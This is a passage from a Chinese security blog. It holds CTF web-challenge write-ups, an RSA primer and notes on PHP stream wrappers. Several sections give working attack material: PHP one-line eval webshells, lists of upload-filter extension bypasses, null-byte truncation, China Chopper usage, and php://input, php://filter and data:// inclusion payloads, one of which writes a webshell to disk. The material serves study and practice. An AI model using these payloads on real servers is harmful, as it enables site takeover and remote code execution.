-<p>根据页面各国国旗位置顺序，对应得出相应的accept-language代码：</p>
-<p>美：en-us；</p>
-<p>英：en-gb；</p>
-<p>法：fr-FR；</p>
-<p>德：de；</p>
-<p>日：jp；</p>
-<p>韩：kor；</p>
-<p>西班牙：esp；</p>
-<p>瑞典：sve；</p>
-<p>4)进行改包尝试：</p>
-<p><img src="https://img-blog.csdnimg.cn/20200831221108316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>返回信息各包含了一部分的flag</p>
-<p>最后拼在一起即是flag.</p>
-<h2 id="第四周-Check-your-source-code"><a href="#第四周-Check-your-source-code" class="headerlink" title="第四周 | Check your source code"></a>第四周 | Check your source code</h2><p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200507073709280-501198872.png" alt="img"></p>
-<p>网页如图，访问源代码，存在一个source.txt文件访问，</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;XXXXXXXXXXXX&quot;</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">&quot;xx&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_</span> POST[<span class="string">&quot;username&quot;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_</span> POST[<span class="string">&quot; password&quot;</span>])&#123;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_</span> POST[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_</span> POST[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_</span> COOKIE[<span class="string">&quot;check&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">&quot;admin&quot;</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_</span> COOKIE[<span class="string">&quot;check&quot;</span>] === base64_ encode(<span class="variable">$secret</span>) . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Login successful.\n&quot;</span> ;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">&quot;The flag is &quot;</span>. <span class="variable">$flag</span>); .</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> ( <span class="string">&quot;重新检查下你的cookie吧!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;你是不是管理员心里没点数吗?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">setcookie(<span class="string">&quot;ahash&quot;</span>, base64_ encode(<span class="variable">$secret</span> . urldecode(<span class="string">&quot; admin&quot;</span> . <span class="string">&quot; admin&quot;</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可得username为admin,password只要不为admin就行，下方有一个setcookie，解码当前网页的cookie可得secret为88,</p>
-<p>构造check值传入</p>
-<p><img src="https://img-blog.csdnimg.cn/20200807092537123.png" alt="在这里插入图片描述"></p>
-<h2 id="第五周-Easy-upload"><a href="#第五周-Easy-upload" class="headerlink" title="第五周 | Easy upload"></a>第五周 | Easy upload</h2><p>一个简单的php文件绕过上传</p>
-<p>查看源码 </p>
-<p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200508172930288-1939397575.png" alt="img"></p>
-<p>上传文件具有格式要求</p>
-<p>在上传一张图片后后得到</p>
-<p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200508173148907-1788213488.png" alt="img"></p>
-<p>它要我们给它一个叫做give_me_flag.php的文件，这个时候，就想到了使用burpsuite去改包。将filename的值改成give_me_flag.php</p>
-<p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200508173546670-1217864792.png" alt="img"></p>
-<p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200508173631623-800669574.png" alt="img"></p>
-<p>用文本打开图片，在最后加入givemeflag，再次提交修改OK,</p>
-<h2 id="第六周-套娃一样的上传"><a href="#第六周-套娃一样的上传" class="headerlink" title="第六周 | 套娃一样的上传"></a>第六周 | 套娃一样的上传</h2><p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200508200105103-581336720.png" alt="img"></p>
-<p>查看源代码，发现只能上传图片，与上次同，png改php得到<img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200509183847068-2002339576.png" alt="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200509183847068-2002339576.png"></p>
-<p>黑名单绕过，</p>
-<p>去改后缀名，php</p>
-<p><strong>大小写绕过</strong>  </p>
-<p>​    aSp  pHp  JsP</p>
-<p><strong>扩展名绕过</strong></p>
-<p>​    Asp：asa cer cdx </p>
-<p>​    Aspx: ashx  asmx ascx</p>
-<p>​    Php:  php3 phtml</p>
-<p>​    Jsp:  jspx  jspf</p>
-<p>OK   改后缀名phtml 到达下一步（phps）</p>
-<p><img src="https://img-blog.csdnimg.cn/20200509194346934.png" alt="img"></p>
-<p>新创一个文本，输入17个1 </p>
-<p>改后缀名phtml上传到达</p>
-<p><img src="https://img2020.cnblogs.com/blog/1837197/202005/1837197-20200509184601187-1482956414.png" alt="img"></p>
-<h2 id="最后总结下常用的php拓展名："><a href="#最后总结下常用的php拓展名：" class="headerlink" title="最后总结下常用的php拓展名："></a>最后总结下常用的php拓展名：</h2><ul>
-<li>php3、php4、php5、php7、phptml、phps、pht、pht、php%00</li>
-</ul>
-<h2 id="第七周-再见上传"><a href="#第七周-再见上传" class="headerlink" title="第七周 | 再见上传"></a>第七周 | 再见上传</h2><p>打开页面是一个上传文件的页面，只能上传jpg,gif,png后缀文件</p>
-<p>上传图片，要求上传php文件，去brup suit抓包该文件后缀无果</p>
-<p><img src="https://img-blog.csdnimg.cn/20201214164105680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="https://img-blog.csdnimg.cn/20201214164105680.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70"></p>
-<p>在php后进行截断绕过无果   </p>
-<p><img src="https://img-blog.csdnimg.cn/20201214164234266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>寻找其他绕过点</p>
-<p>发现在**uploads/**加1会在整个文件名前显示</p>
-<p><img src="https://img-blog.csdnimg.cn/20201214164426702.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p>此时就可以构造文件名 1.php%00（在此处截断）</p>
-<p>因为会进行url编码 ，对%00进行url.decode    再提交得到flag;</p>
-<p><img src="https://img-blog.csdnimg.cn/20201214164708976.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="img"></p>
-<p><img src="https://img-blog.csdnimg.cn/20201214164737601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2pfeF95dWFu,size_16,color_FFFFFF,t_70" alt="img"></p>
-<h2 id="第八周-随意的上传"><a href="#第八周-随意的上传" class="headerlink" title="第八周 | 随意的上传"></a>第八周 | 随意的上传</h2><p>如题上传没有任何限制，直接构造php一句话木马</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>上传成功，却发现用菜刀连不上</p>
-<p>打开在网页上传的文件  发现&lt;?   php   都被过滤</p>
-<p>考虑绕过</p>
-<p>用js方法替代</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language&#x3D;&quot;Php&quot;&gt;@eval($_POST[&#39;pass&#39;])&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
-<p>此时php应该大写，php被ban </p>
-<p>挂马连接成功</p>
-<h3 id="中国菜刀使用："><a href="#中国菜刀使用：" class="headerlink" title="中国菜刀使用："></a>中国菜刀使用：</h3><p>添加一个新的目标网站</p>
-<p>在主视图右键添加  地址是你上传的<strong>木马程序的url</strong> 密码是POST里面的字符串。</p>
-<h2 id="第九周-试下phpinfo吧"><a href="#第九周-试下phpinfo吧" class="headerlink" title="第九周 | 试下phpinfo吧"></a>第九周 | 试下phpinfo吧</h2><p>运用php伪协议</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/03/02/RSA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/03/02/RSA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url">RSA学习笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-02T09:23:47+08:00">
-                2021-03-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><strong>rsa学习笔记</strong></p>
-<p> 大概原理</p>
-<p>​    （1）乙方生成两把密钥（公钥和私钥）。公钥是公开的，任何人都可以获得，私钥则是保密的。</p>
-<p>　　（2）甲方获取乙方的公钥，然后用它对信息加密。</p>
-<p>　　（3）乙方得到加密后的信息，用私钥解密。</p>
-<p> 任意两个质数构成互质关系，比如13和61。</p>
-<p> 一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</p>
-<p> 如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</p>
-<p>​    \4. 和任意一个自然数是都是互质关系，比如1和99。</p>
-<p>\5. p是大于1的整数，则p和p-1构成互质关系，比如57和56。</p>
-<p>\6. p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</p>
-<p><strong><em>\</em>欧拉函数**</strong></p>
-<p> 任意给定正整数n，请问在小于等于n的正整数之中，有多少个与n构成互质关系？</p>
-<p>计算这个值的方法就叫做欧拉函数，以φ(n)表示。在1到8之中，与8形成互质关系的是1、3、5、7，所以 φ(n) = 4。</p>
-<p><strong><em>\</em>第一种情况**</strong></p>
-<p>如果n=1，则 φ(1) = 1 。因为1与任何数（包括自身）都构成互质关系。</p>
-<p><strong><em>\</em>第二种情况**</strong></p>
-<p>如果n是质数，则 φ(n)=n-1 。因为质数与小于它的每一个数，都构成互质关系。比如5与1、2、3、4都构成互质关系。</p>
-<p><strong><em>\</em>第三种情况**</strong></p>
-<p>如果n是质数的某一个次方，即 n = p^k (p为质数，k为大于等于1的整数)</p>
-<p>φ(8) = φ(2^3) =2^3 - 2^2 = 8 -4 = 4</p>
-<p>这是因为只有当一个数不包含质数p，才可能与n互质。而包含质数p的数一共有p^(k-1)个，即1×p、2×p、3×p、…、p^(k-1)×p，把它们去除，剩下的就是与n互质的数。</p>
-<p><strong><em>\</em>第四种情况**</strong></p>
-<p>如果n可以分解成两个互质的整数之积，</p>
-<p>　<strong><em>\</em>n = p1 × p2**</strong></p>
-<p>则</p>
-<p>  <strong><em>\</em>φ(n) = φ(p1p2) = φ(p1)φ(p2)**</strong></p>
-<p>φ(56)=φ(8×7)=φ(8)×φ(7)=4×6=24。</p>
-<p><strong><em>\</em>欧拉定理**</strong></p>
-<p> 如果两个正整数a和n互质，则n的欧拉函数 φ(n) 可以让下面的等式成立：</p>
-<p>​    (a^φ(n)-1)%n == 0   或   a^φ(n)%n == 1</p>
-<p><strong><em>\</em>模反元素**</strong></p>
-<p> 如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-1 被n整除，或者说ab被n除的余数是1。</p>
-<p>b就叫做a的”模反元素”。</p>
-<p>比如，3和11互质，那么3的模反元素就是4，因为 (3 × 4)-1 可以被11整除。显然，模反元素不止一个， 4加减11的整数倍都是3的模反元素 {…,-18,-7,4,15,26,…}，即如果b是a的模反元素，则 b+kn 都是a的模反元素。</p>
-<p>​    欧拉定理可以用来证明模反元素必然存在。可以看到，a的 φ(n)-1 次方，就是a的模反元素。</p>
-<p><strong><em>\</em>密钥生成的步骤**</strong></p>
-<p><img src="file:///C:\Users\JUXY\AppData\Local\Temp\ksohtml15892\wps1.jpg" alt="img"> </p>
-<p><strong><em>\</em>第一步，随机选择两个不相等的质数p和q。**</strong></p>
-<p>爱丽丝选择了61和53。（实际应用中，这两个质数越大，就越难破解。）</p>
-<p><strong><em>\</em>第二步，计算p和q的乘积n。**</strong></p>
-<p>爱丽丝就把61和53相乘。</p>
-<p><strong><em>\</em>n = 61×53 = 3233**</strong></p>
-<p>n的长度就是密钥长度。3233写成二进制是110010100001，一共有12位，所以这个密钥就是12位。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p>
-<p><strong><em>\</em>第三步，计算n的欧拉函数φ(n)。**</strong></p>
-<p>根据公式：</p>
-<p>　　<strong><em>\</em>φ(n) = (p-1)(q-1)**</strong></p>
-<p>爱丽丝算出φ(3233)等于60×52，即3120。</p>
-<p><strong><em>\</em>第四步，随机选择一个整数e，条件是1&lt; e &lt; φ(n)，且e与φ(n) 互质。**</strong></p>
-<p>爱丽丝就在1到3120之间，随机选择了17。（实际应用中，常常选择65537。）</p>
-<p><strong><em>\</em>第五步，计算e对于φ(n)的模反元素d。**</strong></p>
-<p>所谓”模反元素”就是指有一个整数d，可以使得ed被φ(n)除的余数为1。</p>
-<p>　　ed ≡ 1 (mod φ(n))</p>
-<p>这个式子等价于</p>
-<p>　　ed - 1 = kφ(n)</p>
-<p>于是，找到模反元素d，实质上就是对下面这个二元一次方程求解。</p>
-<p>　　ex + φ(n)y = 1</p>
-<p>已知    e=17, φ(n)=3120，</p>
-<p>　　17x + 3120y = 1</p>
-<p>这个方程可以用”扩展欧几里得算法”求解，此处省略具体过程。总之，爱丽丝算出一组整数解为 (x,y)=(2753,-15)，即 d=2753。</p>
-<p><strong><em>\</em>第六步，将n和e封装成公钥，n和d封装成私钥。**</strong></p>
-<p>在爱丽丝的例子中，n=3233，e=17，d=2753，所以公钥就是 (3233,17)，私钥就是（3233, 2753）。</p>
-<p>实际应用中，公钥和私钥的数据都采用<a target="_blank" rel="noopener" href="http://zh.wikipedia.org/zh-cn/ASN.1">ASN.1</a>格式表达（<a target="_blank" rel="noopener" href="http://hi.baidu.com/mathack/item/d0ad4cc1514a3663f7c95da2">实例</a>）。</p>
-<p><strong><em>\</em>RSA可靠性**</strong></p>
-<p>这六个数字之中(n,e,φ(n),d,p,q)，公钥用到了两个（n和e），其余四个数字都是不公开的。其中最关键的是d，因为n和d组成了私钥，一旦d泄漏，就等于私钥泄漏。</p>
-<p>  (1）ed≡1 (mod φ(n))。只有知道e和φ(n)，才能算出d。</p>
-<p> （2）φ(n)=(p-1)(q-1)。只有知道p和q，才能算出φ(n)。</p>
-<p> （3）n=pq。只有将n因数分解，才能算出p和q。</p>
-<p><strong><em>\</em>加密和解密**</strong></p>
-<p>假设鲍勃要向爱丽丝发送加密信息m，他就要用爱丽丝的公钥 (n,e) 对m进行加密。这里需要注意，m必须是整数（字符串可以取ascii值或unicode值），且m必须小于n。</p>
-<p> 所谓”加密”，就是算出下式的c：</p>
-<p>　　m^e ≡ c (mod n)</p>
-<p> 爱丽丝的公钥是 (3233, 17)，鲍勃的m假设是65，那么可以算出下面的等式：</p>
-<p>　　65^17 ≡ 2790 (mod 3233)</p>
-<p>于是，c等于2790，鲍勃就把2790发给了爱丽丝。</p>
-<p><strong><em>\</em>（2）解密要用私钥(n,d)**</strong></p>
-<p> 爱丽丝拿到鲍勃发来的2790以后，就用自己的私钥(3233, 2753) 进行解密。可以证明，下面的等式一定成立：</p>
-<p>　　c^d ≡ m (mod n)</p>
-<p>也就是说，c的d次方除以n的余数为m。现在，c等于2790，私钥是(3233, 2753)，那么，爱丽丝算出</p>
-<p>　　2790^2753 ≡ 65 (mod 3233)</p>
-<p>因此，爱丽丝知道了鲍勃加密前的原文就是65。</p>
-<p>至此，”加密–解密”的整个过程全部完成。</p>
-<p><strong><em>\</em>证明**</strong></p>
-<p>c^d ≡ m (mod n)</p>
-<p>因为，根据加密规则</p>
-<p>ｍ^e ≡ c (mod n)</p>
-<p>于是，c可以写成下面的形式：</p>
-<p>c = m^e - kn</p>
-<p> 将c代入要我们要证明的那个解密规则：</p>
-<p>(m^e - kn)^d ≡ m (mod n)</p>
-<p>它等同于求证</p>
-<p>m^(ed) ≡ m (mod n)</p>
-<p>由于</p>
-<p>ed ≡ 1 (mod φ(n))</p>
-<p>所以</p>
-<p>ed = hφ(n)+1</p>
-<p>将ed代入：</p>
-<p>m^(hφ(n)+1) ≡ m (mod n)</p>
-<p><strong><em>\</em>分情况讨论**</strong></p>
-<p><strong><em>\</em>（1）m与n互质**</strong></p>
-<p>  根据欧拉定理，此时</p>
-<p>　　m^φ(n) ≡ 1 (mod n)</p>
-<p>  得到</p>
-<p>　　(m^φ(n))^h × m ≡ m (mod n)   原式得到证明。</p>
-<p>  <strong><em>\</em>（2）m与n不是互质关系。**</strong></p>
-<p>此时，由于n等于质数p和q的乘积，所以m必然等于kp或kq。</p>
-<p>以 m = kp为例，考虑到这时k与q必然互质，则根据欧拉定理，下面的式子成立：</p>
-<p>　　(kp)^q-1 ≡ 1 (mod q)</p>
-<p>进一步得到</p>
-<p>　　[(kp)^q-1]^h(p-1) × kp ≡ kp (mod q)</p>
-<p>即</p>
-<p>　　(kp)^ed ≡ kp (mod q)</p>
-<p>将它改写成下面的等式</p>
-<p>　　(kp)^ed = tq + kp</p>
-<p>这时t必然能被p整除，即 t=t’p</p>
-<p>　　(kp)^ed = t’pq + kp</p>
-<p>因为 m=kp，n=pq，所以</p>
-<p>　　m^ed ≡ m (mod n)</p>
-<p>原式得到证明。</p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/02/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="榉橡的博客">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/02/27/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/" itemprop="url">PHP伪协议</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-27T19:56:54+08:00">
-                2021-02-27
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="PHP-ini"><a href="#PHP-ini" class="headerlink" title="PHP.ini"></a>PHP.ini</h2><p>在php.ini里有两个重要的参数allow_url_fopen和allow_url_include<br>allow_url_fopen:默认值是ON，允许url里的封装协议访问文件<br>allow_url_include:默认值是OFF,不允许包含url里的封装协议包含文件</p>
-<h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>经常使用的伪协议，一般用于任意文件读取，有时也可以用于getshell.在双OFF的情况下也可以使用.<br>php://filter是一种元封装器，用于数据流打开时筛选过滤应用。这对于一体式（all-in-one）的文件函数非常有用。类似readfile()、file()、file_get_contents(),在数据流读取之前没有机会使用其他过滤器。<br>php://filter参数<br>名称    描述<br>resource=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br>read=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔<br>write=&lt;写链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符(|)分隔<br>&lt;；两个链的筛选列表&gt;     任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</p>
-<p><strong>php://filter/[read/write]=string.[rot13/strip_tags/…..]/resource=xxx</strong></p>
-<p>filter和string过滤器连用可以对字符串进行过滤。filter的read和write参数有不同的应用场景。read用于include()和file_get_contents(),write用于file_put_contents()中。</p>
-<p><strong>php://filter/convert.base64-encode/resource=xxx</strong>针对php文件需要base64编码</p>
-<p><strong>php://filter/convert.base64-decode/resource=xxx</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;phpinfo.php</span><br></pre></td></tr></table></figure>
-<p>这是使用的过滤器是convert.base64-encode.它的作用就是读取upload.php的内容进行base64编码后输出。可以用于读取程序源代码经过base64编码后的数据</p>
-<h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。</p>
-<p>需要开启allow_url_include</p>
-<p>注：<strong>当enctype=”multipart/form-data”时，php://input是无效的</strong>。</p>
-<p><strong>php://input + [POST DATA]`执行php代码</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://segmentfault.com/img/bVbrQBh" alt="图片描述"></p>
-<h4 id="若有写入权限，写入一句话木马"><a href="#若有写入权限，写入一句话木马" class="headerlink" title="若有写入权限，写入一句话木马"></a>若有写入权限，写入一句话木马</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;php:&#x2F;&#x2F;input</span><br><span class="line">[POST DATA部分]</span><br><span class="line">&lt;?php fputs(fopen(&#39;1juhua.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;); ?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="https://segmentfault.com/img/bVbrQBi" alt="图片描述"></p>
-<h2 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h2><p>​    用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响。<br>​    file://伪协议在双OFF的时候也可以用，用于本地文件包含<br>​    <strong>1</strong>.file://[文件的绝对路径和文件名</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/include.php?file=file://E:\phpStudy\PHPTutorial\WWW\phpinfo.txt</span><br></pre></td></tr></table></figure>
-<p>​    <strong>2</strong>.[文件的相对路径和文件名]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;.&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
-<p>​    <strong>3</strong>.[http：//网络路径和文件名]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;phpinfo.txt</span><br></pre></td></tr></table></figure>
-
-
-<h2 id="phar"><a href="#phar" class="headerlink" title="phar://"></a>phar://</h2><p>PHP 归档，常常跟文件包含，文件上传结合着考察。说通俗点就是php解压缩包的一个函数，解压的压缩包与后缀无关。<br>phar://test.[zip/jpg/png…]/file.txt<br>其实可以将任意后缀名的文件(必须要有后缀名)，只要是zip格式压缩的，都可以进行解压，因此上面可以改为phar://test.test/file.txt也可以运行。</p>
-<h2 id="zip-bzip2-zlib"><a href="#zip-bzip2-zlib" class="headerlink" title="zip://,bzip2://, zlib://"></a>zip://,bzip2://, zlib://</h2><p>​    在双OFF的时候也可以用，<code>zip:// &amp; bzip2:// &amp; zlib://</code> 均属于压缩流，可以访问压缩文件中的子文件，更重要的是不需要指定后缀名，可修改为任意后缀：<code>jpg png gif xxx</code> 等等。<br>​    zip://test.zip%23file.txt<br>​    和phar://一样用于读取压缩文件，绝对路径。不过对于”zip://test.zip#file.txt”中的”#”要编码为”%23”.因为url的#后的内容不会被传送</p>
-<ul>
-<li><h2 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h2><ul>
-<li><p><strong>条件</strong>：</p>
-<ul>
-<li><code>allow_url_fopen</code>:on</li>
-<li><code>allow_url_include</code> :on</li>
-</ul>
-</li>
-<li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p>
-</li>
-<li><p><strong>用法</strong>：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:&#x2F;&#x2F;text&#x2F;plain,</span><br><span class="line">data:&#x2F;&#x2F;text&#x2F;plain;base64,</span><br></pre></td></tr></table></figure></li>
-<li><p><strong>示例</strong>：</p>
-<ol>
-<li>`data://text/plain,</li>
-</ol>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;include.php?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
